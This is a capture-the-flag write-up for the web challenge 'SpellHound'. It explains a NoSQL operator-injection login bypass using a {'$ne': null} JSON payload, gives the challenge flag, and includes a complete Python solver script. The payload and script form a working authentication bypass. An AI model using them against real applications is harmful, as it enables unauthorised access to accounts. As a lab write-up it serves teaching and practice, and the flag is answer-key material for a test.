# SpellHound
---
## Challenge Summary

- Challenge: SpellHound
- Category: Web
- Difficulty: Very Easy
- Target: `http://ctf.vulnbydefault.com:27299`

## Vulnerability

The login page explicitly hints that the portal accepts JSON.

When the `/login` endpoint receives JSON, it does not enforce plain string values for `username` and `password`.
That allows a NoSQL-style operator payload instead of normal credentials.

The working payload is:

```json
{
  "username": {"$ne": null},
  "password": {"$ne": null}
}
```

This authenticates successfully and the returned homepage includes the flag in the welcome banner.

## Exploitation Steps

1. Open the challenge URL.
2. Do not use the form login.
3. Send a JSON request to `/login` with the operator payload.
4. Follow the redirect to `/`.
5. Read the flag from the page footer welcome text.

## Why It Works

The backend appears to trust JSON objects during authentication rather than requiring scalar strings.
Using `{"$ne": null}` makes the login condition match an existing user record without knowing a real password.

## Flag

```text
VBD{nosqli_w1th_r3g3x_1s_c00l_7261e788b4475495baa28f69ceef813f}
```

## Solver Script

File: `solve_spellhound.py`

```python
import re
import sys

import requests


def main() -> int:
    base_url = sys.argv[1] if len(sys.argv) > 1 else "http://ctf.vulnbydefault.com:27299"
    session = requests.Session()

    payload = {
        "username": {"$ne": None},
        "password": {"$ne": None},
    }

    login_response = session.post(f"{base_url}/login", json=payload, allow_redirects=False, timeout=15)
    if login_response.status_code not in (302, 303) or login_response.headers.get("Location") != "/":
        print(f"Unexpected login response: {login_response.status_code}")
        print(login_response.text)
        return 1

    home_response = session.get(f"{base_url}/", timeout=15)
    match = re.search(r"VBD\{[^}]+\}", home_response.text)
    if not match:
        print("Flag not found in homepage response")
        print(home_response.text)
        return 2

    print(match.group(0))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

## Run

```powershell
py -3.10 .\solve_spellhound.py http://ctf.vulnbydefault.com:27299
```

